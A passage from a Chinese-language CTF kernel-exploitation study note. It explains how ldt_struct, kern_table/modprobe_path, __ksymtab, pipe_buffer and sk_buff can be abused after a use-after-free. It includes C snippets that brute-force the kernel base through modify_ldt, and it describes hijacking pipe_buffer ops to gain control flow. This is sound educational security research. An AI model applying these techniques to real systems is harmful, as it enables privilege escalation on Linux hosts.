__x86_64__\n\t/*\n\t * Because this bit is not present in 32-bit user code, user\n\t * programs can pass uninitialized values here.  Therefore, in\n\t * any context in which a user_desc comes from a 32-bit program,\n\t * the kernel must act as though lm == 0, regardless of the\n\t * actual value.\n\t */\n\tunsigned int  lm:1;\n#endif\n};\n\n\n//v5.17 /arch/x86/include/asm/desc_defs.h\nstruct desc_struct {\n\tu16\tlimit0;\n\tu16\tbase0;\n\tu16\tbase1: 8, type: 4, s: 1, dpl: 2, p: 1;\n\tu16\tlimit1: 4, avl: 1, l: 1, d: 1, g: 1, base2: 8;\n} __attribute__((packed));\n```\n\n比如有个UAF漏洞，我们就可以借助该函数，申请0x10大小的堆块，修改其`entries`指针，再借助`read_ldt`函数进行读取\n\n```c\nstatic int read_ldt(void __user *ptr, unsigned long bytecount)\n{\n\tstruct mm_struct *mm = current->mm;\n\tunsigned long entries_size;\n\tint retval;\n\n    //......//\n    //entries_size肯定大于8192,那么至少可拷贝8192个字节\n    //#define LDT_ENTRIES    8192\n    entries_size = mm->context.ldt->nr_entries * LDT_ENTRY_SIZE;\n    if (entries_size > bytecount)\n\t\tentries_size = bytecount;\n\tif (copy_to_user(ptr, mm->context.ldt->entries, entries_size)) {\n\t\tretval = -EFAULT;\n\t\tgoto out_unlock;\n\t}\n    //.....//\n\nout_unlock:\n\tup_read(&mm->context.ldt_usr_sem);\n\treturn retval;\n}\n```\n\n- 即获取当前进程中的`ldt_struct`结构体的`entries`指针指向的内存，拷贝`bytecount`个字节给用户\n\n那么当如上述所示，借助UAF修改了`entries`指针之后，就可以进行任意地址读取最少可到达8192个字节的数据。\n\n如果没有地址的话，可以使用爆破的方法来读取内核地址，因为如果没有命中内核空间`copy_to_user`会返回非0值，但是内核不会崩溃，借助这点特性可以用来爆破内核空间。\n\n但是如果存在`harden_usercopy`和`KASLR`，最好还是借助`page_offset_base`和`fork`来从线性分配区中搜索数据，不然当`copy_to_user`的源地址为内核 .text 段（_stext, _etext）时或者线性分配区中的数据较为特殊时会引起`kernel panic`，致使内核崩溃。\n\n原理就是在`fork`时最终调用到的是`ldt_dup_context`函数，该函数有如下操作\n\n```c\nmemcpy(new_ldt->entries, old_mm->context.ldt->entries,\n           new_ldt->nr_entries * LDT_ENTRY_SIZE);\n```\n\n会将父进程的拷贝给子进程，完全在内核中的操作，不会触发`hardened usercopy`的检查，那么只需要在父进程中设定好搜索的地址之后打开子进程来通过`read_ldt()`读取数据即可\n\n```c\nint pipe_fd[2];\nsize_t kernel_base = 0;\nsize_t kernel_offset;\npipe(pipe_fd);\nsize_t searchAddr;\n\n//搜索page_offset_base\nwhile(1)\n{\n    myChunk.len = 0x8;\n    myChunk.idx = 0x0;\n    myChunk.data = &page_offset_base;//change the entries\n    editFun(fd,&myChunk);\n    retval = syscall(SYS_modify_ldt, 0, &desc, 8);//read_ldt 8 bytes form entries\n    if (retval >= 0)//judge yes or no\n        break;\n    page_offset_base += 0x2000000;\n}\nprintf(\"\\033[32m\\033[1m[+] Found page_offset_base: \\033[0m%lx\\n\", page_offset_base);\n\n\n//从page_offset_base中搜索内核函数地址\nsearchAddr = page_offset_base;\nwhile(1)\n{\n    myChunk.idx = 0x0;\n    myChunk.data = &searchAddr\n    editFunc(fd, &myChunk);//修改entries指针\n    retval = fork();\n    if (!retval)    // child\n    {\n        //读取0x8000数据\n        syscall(SYS_modify_ldt, 0, buf, 0x8000);\n        for (int i = 0; i < 0x1000; i++)\n        {\n            //选取特征数据\n            if ((buf[i] >= 0xffffffff81000000)  && ((buf[i] & 0xfff) == 0x030))\n            {\n                kernel_base = buf[i] -  0x030;\n                kernel_offset = kernel_base - 0xffffffff81000000;\n                printf(\"\\033[32m\\033[1m[+] Found kernel base: \\033[0m%p\\033[32m\\033[1m at \\033[0m%p\\n\", kernel_base, search_addr);\n                printf(\"\\033[32m\\033[1m[+] Kernel offset: \\033[0m%p\\n\", kernel_offset);\n                break;\n            }\n        }\n        write(pipe_fd[1], &kernel_base, 8);\n        exit(0);\n    }\n    wait(NULL);\n    read(pipe_fd[0], &kernel_base, 8);\n    if (kernel_base)\n        break;\n    search_addr += 0x8000;\n}\nkernel_offset = kernel_base - 0xffffffff81000000;\n```\n\n\n\n### (3)实现任意地址写\n\n同样的还是关于`entries`指针，如下在`write_ldt`函数中的代码，`entry_number`可控，`ldt`不太可控，那么可以先`write_ldt`一个`new_nr_entries`出来，然后再下一次`write_ldt`就可以给`old_nr_entries`赋值，进而在`memcpy`的时候拷贝大量数据。\n\n```c\nold_nr_entries = old_ldt ? old_ldt->nr_entries : 0;\nnew_nr_entries = max(ldt_info.entry_number + 1, old_nr_entries);\n//...//\n//设置新ldt_struct结构体的entries指针\n //#define LDT_ENTRY_SIZE    8\nif (old_ldt)\n    memcpy(new_ldt->entries, old_ldt->entries, old_nr_entries * LDT_ENTRY_SIZE);\n\n//从ldt结构体中拷贝8个字节到对应位置\nnew_ldt->entries[ldt_info.entry_number] = ldt;\n```\n\n而如果这时有个条件竞争，在拷贝过程中将`new_ldt->entries`给劫持了，那么就可以借助拷贝之后的语句`new_ldt->entries[ldt_info.entry_number] = ldt;`来依据`ldt`修改劫持之后的`new_ldt->entries`对应内存。\n\n不过需要注意的是，虽然可以修改，但是其实`ldt`由于之前提到的设置原因，其数据会有所改变，不太能随意可控，但是如果可以设置4个字节的0数据，那就可以设置当前进程的euid了，这样也能提权，但是还没接触到怎么通过euid设置来提权。\n\n但是`arttnba3`师傅写的用来修改euid之后调用`seteuid`的方法好使，不太清楚为什么，这个方法需要的数据不用太严苛吗?不太清楚哎。\n\n[【CTF.0x05】TCTF2021-FINAL 两道 kernel pwn 题解 - arttnba3's blog](https://arttnba3.cn/2021/10/31/CTF-0X05-TCTF2021_FINAL/)\n\n```c\ndesc.base_addr = 0;\ndesc.entry_number = 2;\ndesc.limit = 0;\ndesc.seg_32bit = 0;\ndesc.contents = 0 ;\ndesc.limit_in_pages = 0;\ndesc.lm = 0;\ndesc.read_exec_only = 0;\ndesc.seg_not_present = 0;\ndesc.useable = 0;\nsleep(3);\nsyscall(SYS_modify_ldt, 1, &desc, sizeof(desc));\n```\n\n\n\n## 5.kern_table数组\n\n### 前置知识\n\n这个不能叫结构体吧，不过这个可以利用\n\n```c\n//v5.17  /kernel/sysctl.c\nstatic struct ctl_table kern_table[] = {\n    //......\n    #ifdef CONFIG_MODULES\n    {\n        .procname\t= \"modprobe\",\n        .data\t\t= &modprobe_path,\n        .maxlen\t\t= KMOD_PATH_LEN,\n        .mode\t\t= 0644,\n        .proc_handler\t= proc_dostring,\n    },\n    {\n        .procname\t= \"modules_disabled\",\n        .data\t\t= &modules_disabled,\n        .maxlen\t\t= sizeof(int),\n        .mode\t\t= 0644,\n        /* only handle a transition from default \"0\" to \"1\" */\n        .proc_handler\t= proc_dointvec_minmax,\n        .extra1\t\t= SYSCTL_ONE,\n        .extra2\t\t= SYSCTL_ONE,\n    },\n    #endif\n    //......\n}\n```\n\n其中包含很多`/proc/sys/kernel/`下的文件句柄，这些是在linux内核启动时就进行映射的，和文件相关一一对应，如果我们能修改这些句柄，比如将`data`指针修改到任意位置，当我们打开`/proc/sys/kernel/`下对应的文件时，就能依据`data`指针，读取到该指针对应的数据。\n\n而我们主要就是利用其中的`CONFIG_MODULES`定义下的`modprobe`，也就是以前提权经常用到的`modprobe_path`，可以看到，`modeprobe`这个文件映射句柄其中保存着`modprobe_path`这个全局变量\n\n![image-20220328141017757](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281410940.png)\n\n内存分布如下\n\n![image-20220328141220790](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281412927.png)\n\n### 实现任意读取\n\n#### 内存映射\n\n除了上述的启动内核时发生映射外，当我们运行程序时，也会在内核的线性分配区`page_offset_base`即`0xffff888000000000`发生映射，比如如下的v5.6版本下的内核，没开启KASLR的情况下映射偏移为`0x2444100`如下所示\n\n![image-20220328170627765](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281706047.png)\n\n可以看到数据完全一致，而由于是映射关系，当我们修改其中一部分的数据时，另一部分数据也会发生变化，尝试修改`data`指针为`0xffffffff82446ab0`，两边都发生了变化。\n\n![image-20220328171003365](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281710474.png)\n\n#### 内存复制\n\n除了内存映射区域之外，还有一个内存复制区域，也是在`page_offset_base`上，比如这里的偏移为`0xec8a440`\n\n![image-20220328172112145](https://pig-007.oss-cn-beijing.aliyuncs.com/img/202203281721303.png)\n\n可以看到完全一样的，但是由于是复制的关系，所以不存在映射关系，所以我们可以将内存映射的`modprobe`的`data`指针指向内存复制的`modprobe`的`data`指针，打开`/proc/sys/kernel/modprobe`文件即可获取到内存复制区域的`modprobe`的`data`指针数据，即`modprobe_path`的地址，这样我们就可以在只有堆地址和任意写的时候，不泄露内核基地址的情况下，完成`modprobe_path`的地址泄露。\n\n#### KASLR\n\n如果开启了`KASLR`的话，就有点不同了，由于是文件内存映射和复制的关系，所以这个映射和复制的偏移量其实比较取决于文件系统和内核版本，内核的文件系统比较复杂，VFS接口下可连接一堆的文件系统，每个文件系统又都有点不一样，所以一般都需要实际分析，以下是我的测试结果\n\n##### SVR4\n\n这个文件系统也就是我们kernel题中常见的cpio后缀使用的，没有开启KASLR的时候，映射和复制的偏移都是确定的，实际调一下，借用peda插件的find功能可以容易搜索到。但是开启之后，复制的偏移基本不会变化，但是映射的偏移会发生变化，测试多次如下\n\n```\nv5.6\n#modprobe_map 0x2444100\n#modprobe_map 0x6844100\n#modprobe_map 0x6c44100\n#modprobe_map 0xd244100\n#modprobe_map 0x5844100\n\n#modprobe_copy 0xec8a440\n```\n\n但是观察也可以看到，其实偏移发生的话，相对于映射区域，只有一个字节发生改变，那么我们就可以尝试爆破这一个字节来获取。\n\n##### ext4\n\n这个文件系统的也比较常见，不过比较好的一点就是，实际测试结果发现映射和复制的偏移在开启KASLR之后都不会发生改变，所以测出来就可以直接使用了。\n\n```\nv5.15.26\n#modprobe_map 0x3502530\n#modprobe_copy 0x264e608\n```\n\n这个主要是最近的LINECTF上的encrypt这个内核题事后看WP出来的，忘记哪位师傅了。\n\n### 其他猜想\n\n之前的`kern_table`的结构可以看到，每个文件都有`.mode`属性，这个属性其实就是该文件的权限属性，也就是我们输入`ls -al file`出来的相关权限\n\n![image-20220329193540405](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220329193540405.png)\n\n我们也可以对其进行操控。\n\n#### 权限更改\n\n猜想一下如果更改该文件，使其内容变为一个可执行的elf文件，功能为`cat /flag`，然后更改其权限，赋予suid的权限，那么在执行过程中，就可以以root权限来`cat flag`。形式如下\n\n![image-20220329205636964](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220329205636964.png)\n\n\n\n#### 存在问题\n\n但是这里有点问题，我实际操作的时候，权限倒是很容易更改，但是内容不能写入`\\x00`和`\\n`，就很不好制作一个可执行的ELF文件，不知道有没有什么其他办法绕过。\n\n可参考：[打造史上最小可执行ELF文件(45字节) - C 语言编程透视 (gitbook.io)](https://tinylab-1.gitbook.io/cbook/02-chapter8)\n\n此外之前P神的文章也提到，如果只是suid的权限的话，用shell脚本是不行的，所以这方面也不太能够搞定。\n\n[谈一谈Linux与suid提权 | 离别歌 (leavesongs.com)](https://www.leavesongs.com/PENETRATION/linux-suid-privilege-escalation.html)\n\n至今还是不知道有没有什么其他的方法来绕过。\n\n## 6.__ksymtab数组\n\n### 前置知识\n\n通常用在开启`FG-KASLR`的情况，该保护需要编译时开启\n\n```\nCONFIG_FG_KASLR=y\nCONFIG_MODULE_FG_KASLR=y #模块随机化\n```\n\n通过`nofgkaslr`来关闭\n\n不过我在编译设置`.config`的时候，没有找到这些选项，不知道为什么。\n\n参考：\n\n[FGKASLR - CTF Wiki (ctf-wiki.org)](https://ctf-wiki.org/pwn/linux/kernel-mode/defense/randomization/fgkaslr/#__ksymtab)\n\n[Kernel_pwn FG_KASLR in ROP | An9Ela (zhangyidong.top)](https://zhangyidong.top/2021/02/10/kernel_pwn(fg_kaslr)/)\n\n主要在于\n\n- 内核符号表`__ksymtab `\n- `.data`\n\n- `swapgs_restore_regs_and_return_to_usermode`\n- `modprobe_path`\n- 存在于`.text_base`到`__x86_retpoline_r15`的函数没有受到影响。显然`commit_creds`和`prepare_kernel_cred()`没有包含在内，但是可以在里面寻找一些gadget\n\n以上均不会发生`FG-KASLR`的随机化\n\n那么这里就是主要关注于`__ksymtab`数组，存在于该数组中的每一个函数块都有如下结构\n\n```c\n//v5.17 /include/linux/export.h\nstruct kernel_symbol {\n\tint value_offset;\n\tint name_offset;\n\tint namespace_offset;\n};\n```\n\n注意是在v5.17下，在低版本下好像名字有点不同，不过也大同小异\n\n### 绕过FG-KASLR\n\n因为`__ksymtab`是不会被该机制影响的，所以我们肯定可以在没有开启KASLR的时候通过`kallsym`来获取到该地址，接着就可以找到对应函数的`kernel_symbol`结构体偏移，如下所示\n\n![image-20220330113641265](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330113641265.png)\n\n所以就可以这样来得到对应的任意地址，计算的时候可以这样计算，通过补码来进行计算更快一点。\n\n![image-20220330113813160](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220330113813160.png)\n\n\n\n## 7.pipe管道---kmalloc-1024/kmalloc-192\n\n参照：[(31条消息) Linux系统调用：pipe()系统调用源码分析_rtoax的博客-CSDN博客_linux pipe 源码](https://blog.csdn.net/Rong_Toa/article/details/116270704)****\n\n通常来讲，管道用来在父进程和子进程之间通信，因为`fork`出来的子进程会继承父进程的文件描述符副本。这里就使用当前进程来创建管道符，从管道的读取端(`pipe_fd[0]`)和写入端(`pipe_fd[1]`)来进行利用。\n\n### (1)使用方法\n\n#### ①创建\n\n```c\n#include <unistd.h>\n\n//使用pipe或者pipe2\nint pipe_fd[2];\n\npipe(pipe_fd);//默认阻塞状态\n//pipe2(pipe_fd,flag);\n```\n\n其中`pipe2`函数或者系统调用`__NR_pipe2`的`flag`支持除0之外的三种模式，可用在`man`手册中查看。\n\n如果传入的`flag`为0，则和`pipe`函数是一样的，是阻塞的。\n\n阻塞状态：即当没有数据在管道中时，如果还调用`read`从管道读取数据，那么就会使得程序处于阻塞状态，其他的也是类似的情况。\n\n会默认创建两个fd文件描述符的，该fd文件描述符效果的相关结构如下\n\n```c\n//v5.9  /fs/pipe.c\nconst struct file_operations pipefifo_fops = {\n\t.open\t\t= fifo_open,\n\t.llseek\t\t= no_llseek,\n\t.read_iter\t= pipe_read,\n\t.write_iter\t= pipe_write,\n\t.poll\t\t= pipe_poll,\n\t.unlocked_ioctl\t= pipe_ioctl,\n\t.release\t= pipe_release,\n\t.fasync\t\t= pipe_fasync,\n};\n```\n\n放入到`pipe_fd`中，如下\n\n```c\nint pipe_fd[2];\npipe(pipe_fd);\n\nprintf(\"pipe_fd[0]:%d\\n\",pipe_fd[0]);\nprintf(\"pipe_fd[1]:%d\\n\",pipe_fd[1]);\n```\n\n效果如下：\n\n![image-20220509161948796](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509161948796.png)\n\n之后使用`write/read`来写入读取即可，注意写入端为`fd[1]`，读取端为`fd[0]`\n\n```c\nchar buf[0x8] = {0};\nchar* msg = \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\";\nwrite(pipe_fd[1],msg,0x8);\nread(pipe_fd[0],buf,0x8);\n```\n\n\n\n#### ②释放\n\n由于`pipe`管道创建后会对应创建文件描述符，所以释放两端对应的文件描述符即可释放管道`pipe`管道\n\n```c\nclose(pipe_fd[0]);\nclose(pipe_fd[1]);\n```\n\n需要将两个文件描述符fd都给释放掉或者使用`read`将管道中所有数据都读取出来，才会进入`free_pipe_info`函数来释放在线性映射区域申请的相关内存资源，否则还是不会进入的。\n\n\n\n### (2)内存分配与释放\n\n#### ①分配\n\n发生在调用`pipe`/`pipe2`函数，或者系统调用`__NR_pipe`/`__NR_pipe2`时，内核入口为\n\n```c\nSYSCALL_DEFINE2(pipe2, int __user *, fildes, int, flags)\n{\n\treturn do_pipe2(fildes, flags);\n}\n\nSYSCALL_DEFINE1(pipe, int __user *, fildes) /* pipe() 系统调用 */\n{\n\treturn do_pipe2(fildes, 0);\n}\n```\n\n函数调用链：\n\n```\ndo_pipe2()->__do_pipe_flags()->create_pipe_files()->get_pipe_inode()->alloc_pipe_info()\n```\n\n调用之后会在内核的线性映射区域进行内存分配，也就是常见的内核堆管理的区域。分配点在如下函数中：\n\n```c\n//v5.9 /fs/pipe.c\nstruct pipe_inode_info *alloc_pipe_info(void)\n{\n\tstruct pipe_inode_info *pipe;\n\tunsigned long pipe_bufs = PIPE_DEF_BUFFERS;\n\n    //#define PIPE_DEF_BUFFERS\t16\n    //.....\n    //pipe_inode_info管理结构，大小为0xa0，属于kmalloc-192\n\tpipe = kzalloc(sizeof(struct pipe_inode_info), GFP_KERNEL_ACCOUNT);\n\tif (pipe == NULL)\n\t\tgoto out_free_uid;\n\n    //.....\n    //相关的消息结构为pipe_buffer数组,总共16*0x28=0x280,直接从kmalloc-1024中拿取堆块\n\tpipe->bufs = kcalloc(pipe_bufs, sizeof(struct pipe_buffer),\n\t\t\t     GFP_KERNEL_ACCOUNT);\n    \n    //.....\n\t//对申请的pipe管道进行一些初始化\n\tif (pipe->bufs) {\n\t\tinit_waitqueue_head(&pipe->rd_wait);\n\t\tinit_waitqueue_head(&pipe->wr_wait);\n\t\tpipe->r_counter = pipe->w_counter = 1;\n\t\tpipe->max_usage = pipe_bufs;\n\t\tpipe->ring_size = pipe_bufs;\n\t\tpipe->nr_accounted = pipe_bufs;\n\t\tpipe->user = user;\n\t\tmutex_init(&pipe->mutex);\n\t\treturn pipe;\n\t}\n\n    //.....\n    //出错的话则会释放掉，具体干啥的不太清楚\nout_free_uid:\n\tfree_uid(user);\n\treturn NULL;\n}\n```\n\n相关的`pipe_inode_info`结构如下\n\n```c\n//v5.9 /include/linux/pipe_fs_i.h\nstruct pipe_inode_info {\n\tstruct mutex mutex;\n\twait_queue_head_t rd_wait, wr_wait;\n\tunsigned int head;\n\tunsigned int tail;\n\tunsigned int max_usage;\n\tunsigned int ring_size;\n#ifdef CONFIG_WATCH_QUEUE\n\tbool note_loss;\n#endif\n\tunsigned int nr_accounted;\n\tunsigned int readers;\n\tunsigned int writers;\n\tunsigned int files;//文件描述符计数，都为0时才会释放管道\n\tunsigned int r_counter;\n\tunsigned int w_counter;\n\tstruct page *tmp_page;\n\tstruct fasync_struct *fasync_readers;\n\tstruct fasync_struct *fasync_writers;\n    //pipe_buffer数组,16个,每个大小为0xa0,通常我们从这上面泄露地址或者劫持程序流\n\tstruct pipe_buffer *bufs;\n\tstruct user_struct *user;\n#ifdef CONFIG_WATCH_QUEUE\n\tstruct watch_queue *watch_queue;\n#endif\n};\n```\n\n\n\n#### ②释放\n\n直接使用`close`函数释放管道相关的文件描述符fd两端。\n\n函数链调用链：\n\n```\npipe_release()->put_pipe_info()->free_pipe_info()\n```\n\n需要注意的时，在`put_pipe_info`函数中\n\n```c\n//v5.9 /fs/pipe.c\nstatic void put_pipe_info(struct inode *inode, struct pipe_inode_info *pipe)\n{\n\tint kill = 0;\n\n\tspin_lock(&inode->i_lock);\n\tif (!--pipe->files) {\n\t\tinode->i_pipe = NULL;\n\t\tkill = 1;\n\t}\n\tspin_unlock(&inode->i_lock);\n\n    //当files为0才会进入该函数\n\tif (kill)\n\t\tfree_pipe_info(pipe);\n}\n```\n\n只有`pipe_inode_info`这个管理结构中的`files`成员为0，才会进行释放，也就是管道两端都关闭掉才行。\n\n相关释放函数`free_pipe_info`\n\n```c\n//v5.9 /fs/pipe.c\nvoid free_pipe_info(struct pipe_inode_info *pipe)\n{\n\tint i;\n    //....\n    //和管道相关的释放有关，也是相关的漏洞点\n\tfor (i = 0; i < pipe->ring_size; i++) {\n\t\tstruct pipe_buffer *buf = pipe->bufs + i;\n\t\tif (buf->ops)\n\t\t\tpipe_buf_release(pipe, buf);\n\t}\n    //......\n    //释放pipe_buffer数组,kmalloc-1024\n\tkfree(pipe->bufs);\n    //释放pipe_inode_info管理结构,kmalloc-192\n\tkfree(pipe);\n}\n```\n\n\n\n### (3)利用\n\n#### ①信息泄露\n\n`pipe_buffer`结构的`buf`\n\n```c\n//v5.9 /include/linux/pipe_fs_i.h\nstruct pipe_buffer {\n\tstruct page *page;\n\tunsigned int offset, len;\n\tconst struct pipe_buf_operations *ops;\n\tunsigned int flags;\n\tunsigned long private;\n};\n```\n\n其中的`ops`成员，即`struct pipe_buf_operations`结构的`pipe->bufs[i]->ops`，其中保存着全局的函数表，可通过这个来泄露内核基地址，相关结构如下所示\n\n```C\n//v5.9 /include/linux/pipe_fs_i.h\nstruct pipe_buf_operations {\n\tint (*confirm)(struct pipe_inode_info *, struct pipe_buffer *);\n\n\tvoid (*release)(struct pipe_inode_info *, struct pipe_buffer *);\n\n\tbool (*try_steal)(struct pipe_inode_info *, struct pipe_buffer *);\n\n\tbool (*get)(struct pipe_inode_info *, struct pipe_buffer *);\n};\n```\n\n#### ②劫持程序流\n\n当关闭了管道的两端时，调用到`free_pipe_info`函数，在清理`pipe_buffer`时进入如下判断：\n\n```c\nif (buf->ops)\n    pipe_buf_release(pipe, buf);\n```\n\n当管道中存在未被读取的数据时，即我们需要调用`write`向管道的写入端写入数据\n\n```c\n//v5.9 /fs/pipe.c\nstatic ssize_t\n    pipe_write(struct kiocb *iocb, struct iov_iter *from)\n{\n    //......\n    struct pipe_buffer *buf = &pipe->bufs[(head - 1) & mask];\n    //......\n    buf = &pipe->bufs[head & mask];\n    buf->page = page;\n    buf->ops = &anon_pipe_buf_ops;\n    buf->offset = 0;\n    buf->len = 0;\n    //......\n\n}\n```\n\n然后不要将数据全部读取出来，如果全部读取出来的话，那么在`read`对应的`pipe_read`函数中就会如下情况\n\n```c\n//v5.9  /fs/pipe.c\nstatic ssize_t\n    pipe_read(struct kiocb *iocb, struct iov_iter *to)\n{\n    //....\n    struct pipe_buffer *buf = &pipe->bufs[(head - 1) & mask];\n    //....\n    if (!buf->len) {\n        pipe_buf_release(pipe, buf);\n        //....\n    }\n    //....\n}\n```\n\n从而调用`pipe_buf_release`将`buf->ops`清空。\n\n🔺注：（其实这里既然调用到了`pipe_buf_release`函数，那么我们直接通过`read`将管道`pipe`中的所有数据读取出来，其实也能执行该`release`函数指针的，从而劫持程序控制流的。）\n\n那么接着上述的情况，那么在关闭两端时`buf->ops`这个函数表就会存在\n\n![image-20220509192251738](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509192251738.png)\n\n而当`buf->ops`这个函数表存在时，关闭管道符两端进入上述判断之后，就会调用到其中的`pipe_buf_release`函数，该函数会调用到这个`buf->ops`函数表结构下对应的`relase`函数指针，该指针在上述的`pipe_buf_operations`结构中有提到\n\n![image-20220509193945468](https://pig-007.oss-cn-beijing.aliyuncs.com/img/image-20220509193945468.png)\n\n那么如果劫持了`buf->ops`这个函数表，就能控制到`release`函数指针，从而劫持控制流程。\n\n不过`pipe`管道具体的保存的数据放在哪里，还是不太清楚，听`bsauce`说是在`struct pipe_buffer`结构下`buf`的`page`里面，但是没有找到，后续还需要继续看看，先mark一下。这样也可以看出来，每写入一条信息时，内核的`kmalloc`对应的堆内存基本是不发生变化的，与下面提到的`sk_buff`有点不同。\n\n## 8.sk_buff---kmalloc-512及以上\n\n参考：[(31条消息) socketpair的用法和理解_雪过无痕_的博客-CSDN博客_socketpair](https://blog.csdn.net/weixin_40039738/article/details/81095013)\n\n和该结构体相关的是一个`socketpair`系统调用这个也算是`socket`网络协议的一种，但是是在本地进程之间通信的，而非在网络之间的通信。说到底，这个其实和`pipe`非常像，也是一个进程间的通信手段。不过相关区分如下：\n\n- 数据传输模式\n  - `pipe`：单工，发送端`fd[1]`发送数据，接收端`fd[0]`接收数据\n  - `socketpair`：全双工，同一时刻两端均可发送和接收数据，无论信道中的数据是否被接收完毕。\n- 模式\n  - `pipe`：由`flag`来定义不同模式\n  - `socketpair`：默认阻塞状态\n\n此外在《Linux系统编程手册》一书中提到，`pipe()`函数实际上被实现成了一个对`socketpair`的调用。\n\n### (1)使用方法\n\n#### ①创建\n\n```c\n#include <sys/socket.h>\n\n//默认必须\nint socket_fd[2];\n//domain参数必须被指定为AF_UNIX,不同的\nint sockPair_return = socketpair(AF_UNIX, SOCK_STREAM, 0, socket_fd);\nif( sockPair_return < 0){\n    perror( \"socketpair()\" );\n    exit(1);\n}\n```\n\n然后和`pipe`管道一样，使用`write/read`即可，不过这个的fd两端都可以写入读取，但是消息传递的时候一端写入消息，就需要从另一端才能把消息读取出来\n\n```c\nchar buf[0x8] = {0};\nchar* msg = \"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\";\nwrite(socket_fd[0],msg,0x8);\nread(socket_fd[1],buf,0x8);\n```\n\n#### ②释放\n\n```c\nclose(socket_fd[0]);\nclose(socket_fd[1]);\n```\n\n可以看到和`pipe`是很相似的。\n\n### (2)内存分配与释放\n\n在调用`socketpair`这个系统调用号时，并不会进行相关的内存分配，只有在使用`write`来写入消息，进行数据传输时才会分配。\n\n#### ①分配\n\n在调用`write`进行数据写入时\n\n函数链：\n\n```c\nwrite -> ksys_write() -> vfs_write() -> new_sync_write() -> call_write_iter() -> sock_write_iter() -> sock_sendmsg() -> sock_sendmsg_nosec() -> unix_stream_sendmsg()->内存申请/数据复制\n```\n\n在`unix_stream_sendmsg`开始分叉\n\n```c\n//v5.9 /net/unix/af_unix.c\nstatic int unix_stream_sendmsg(struct socket *sock, struct msghdr *msg,\n\t\t\t       size_t len)\n{\n\tstruct sock *sk = sock->sk;\n\tstruct sock *other = NULL;\n\tint err, size;\n\tstruct sk_buff *skb;\n\tint sent = 0;\n\tstruct scm_cookie scm;\n\tbool fds_sent = false;\n\tint data_len;\n\t//.....\n\twhile (sent < len) {\n\t\tsize = len - sent;\n\t\t/* Keep two messages in the pipe so it schedules better */\n\t\tsize = min_t(int, size, (sk->sk_sndbuf >> 1) - 64);\n\t\t/* allow fallback to order-0 allocations */\n\t\tsize = min_t(int, size, SKB_MAX_HEAD(0) + UNIX_SKB_FRAGS_SZ);\n\t\tdata_len = max_t(int, 0, size - SKB_MAX_HEAD(0));\n\t\tdata_len = min_t(size_t, size, PAGE_ALIGN(data_len));\n        //------------------分叉一:内存申请部分\n\t\tskb = sock_alloc_send_pskb(sk, size - data_len, data_len,\n\t\t\t\t\t   msg->msg_flags & MSG_DONTWAIT, &err,\n\t\t\t\t\t   get_order(UNIX_SKB_FRAGS_SZ));\n        //相关检查部分\n\t\tif (!skb)\n\t\t\tgoto out_err;\n\t\t/* Only send the fds in the first buffer */\n\t\terr = unix_scm_to_skb(&scm, skb, !fds_sent);\n\t\tif (err < 0) {\n\t\t\tkfree_skb(skb);\n\t\t\tgoto out_err;\n\t\t}\n\t\t//.....\n        //----------------------分叉二:数据复制部分\n\t\tskb_put(skb, size - data_len);\n\t\tskb->data_len = data_len;\n\t\tskb->len = size;\n        //这里开始进行数据复制\n\t\terr = skb_copy_datagram_from_iter(skb, 0, &msg->msg_iter, size);\n\t\tif (err) {\n\t\t\tkfree_skb(skb);\n\t\t\tgoto out_err;\n\t\t}\n        //.....\n\t\tsent += size;\n\t}\n\t//......\n\n\treturn sent;\nout_err:\n\tscm_destroy(&scm);\n\treturn sent ? : err;\n}\n```\n\n##### A.内存申请\n\n先进行相关内存申请，即`sock_alloc_send_pskb() -> alloc_skb_with_frags() -> alloc_skb() -> __alloc_skb()`\n\n还是挺长的，但是最重要的还是最后的`__alloc_skb`函数，\n\n```c\n//v5.9 /net/core/skbuff.c\nstruct sk_buff *__alloc_skb(unsigned int size, gfp_t gfp_mask,\n\t\t\t    int flags, int node)\n{\n\tstruct kmem_cache *cache;\n\tstruct skb_shared_info *shinfo;\n\tstruct sk_buff *skb;\n\tu8 *data;\n\tbool pfmemalloc;\n\n\tcache = (flags & SKB_ALLOC_FCLONE)\n\t\t? skbuff_fclone_cache : skbuff_head_cache;\n\n\tif (sk_memalloc_socks() && (flags & SKB_ALLOC_RX))\n\t\tgfp_mask |= __GFP_MEMALLOC;\n\n\t/* Get the HEAD */\n    //从专门的缓存池skbuff_fclone_cache/skbuff_head_cache中申请内存\n    //作为头部的管理结构\n\tskb = kmem_cache_alloc_node(cache, gfp_mask & ~__GFP_DMA, node);\n\tif (!skb)\n\t\tgoto out;\n\t//......\n    //先对齐，这个和L1_CACHE_BYTES有关,64位系统即和64(0x40)对齐,32位类似，具体的还是查一下最好\n\tsize = SKB_DATA_ALIGN(size);\n    //size += 对齐之后的0x140\n    //那么size只可能是0x140+n*0x40,最低为0x180,属于kmalloc-512\n\tsize += SKB_DATA_ALIGN(sizeof(struct skb_shared_info));\n    \n    //虽然是kmalloc_reserve函数，但是最终还是kmalloc形式\n    //调用到`__kmalloc_node_track_caller`函数进行分配\n    //这个data即为我们实际的存储数据的地方,也是从kmalloc申请出的堆块\n    //并且是从对开的开头位置处开始存储,完成内存申请后返回unix_stream_sendmsg函数\n    //在`skb_copy_datagram_from_iter`函数中数据会被复制\n\tdata = kmalloc_reserve(size, gfp_mask, node, &pfmemalloc);\n\tif (!data)\n\t\tgoto nodata;\n\t//...\n\tsize = SKB_WITH_OVERHEAD(ksize(data));\n\t//....\n    //初始化头部的管理结构\n\tmemset(skb, 0, offsetof(struct sk_buff, tail));\n\t/* Account for allocated memory : skb + skb->head */\n\tskb->truesize = SKB_TRUESIZE(size);\n\tskb->pfmemalloc = pfmemalloc;\n\trefcount_set(&skb->users, 1);\n\tskb->head = data;\n\tskb->data = data;\n\tskb_reset_tail_pointer(skb);\n\tskb->end = skb->tail + 